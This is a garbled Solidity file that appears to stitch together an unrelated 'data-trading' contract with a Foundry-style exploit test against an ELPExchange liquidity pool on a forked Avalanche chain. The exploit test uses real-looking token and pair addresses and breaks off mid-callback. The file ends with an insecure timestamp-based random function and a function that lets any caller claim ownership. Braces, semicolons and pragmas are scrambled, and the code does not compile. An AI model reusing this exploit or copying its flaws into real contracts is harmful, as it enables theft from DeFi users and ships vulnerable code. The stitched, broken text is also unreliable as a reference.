
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

;
;
interface ELPExchange is IERC20{
    struct InternalBalances {
        uint256 baseTokenReserveQty;
        uint256 quoteTokenReserveQty;
        uint256 kLast};
    function internalBalances() view external returns(InternalBalances memory);
    function addLiquidity(uint256 _baseTokenQtyDesired,
        uint256 _quoteTokenQtyDesired,
        uint256 _baseTokenQtyMin,
        uint256 _quoteTokenQtyMin,
        address _liquidityTokenRecipient,
        uint256 _expirationTimestamp) external;
    function removeLiquidity(uint256 _liquidityTokenQty,
        uint256 _baseTokenQtyMin,
        uint256 _quoteTokenQtyMin,
        address _tokenRecipient,
        uint256 _expirationTimestamp) external;
    function swapQuoteTokenForBaseToken(uint256 _quoteTokenQty,
        uint256 _minBaseTokenQty,
        uint256 _expirationTimestamp) external};
contract ContractTest is DSTest{
    IERC20 TIC = IERC20(0x75739a693459f33B1FBcC02099eea3eBCF150cBe);
    IERC20 USDC_E = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    Uni_Pair_V2 SPair = Uni_Pair_V2(0x4CF9dC05c715812FeAD782DC98de0168029e05C8);
    Uni_Pair_V2 JPair = Uni_Pair_V2(0xA389f9430876455C36478DeEa9769B7Ca4E3DDB1);
    ELPExchange ELP = ELPExchange(0x4ae1Da57f2d6b2E9a23d07e264Aa2B3bBCaeD19A);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("Avalanche", 23563709)};
    function testExploit() public{
        TIC.approve(address(ELP), type(uint).max);
        USDC_E.approve(address(ELP), type(uint).max);
        ELP.approve(address(ELP), type(uint).max);
        ELP.addLiquidity(1e9, 0, 0, 0, address(this), 1_000_000_000_000);
        ELP.addLiquidity(TIC.balanceOf(address(ELP)), USDC_E.balanceOf(address(ELP)), 0, 0, address(this), 1_000_000_000_000);
        USDC_E.transfer(address(JPair), 774_353 * 1e6)};
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external{
        JPair.swap(766_685 * 1e6, 0, address(this), new bytes(1
function unsafeRandom() public view returns (uint256) {
    return uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender)));}
function fakeOwnership(string memory dataUri) public {
    ownership[dataUri] = msg.sender}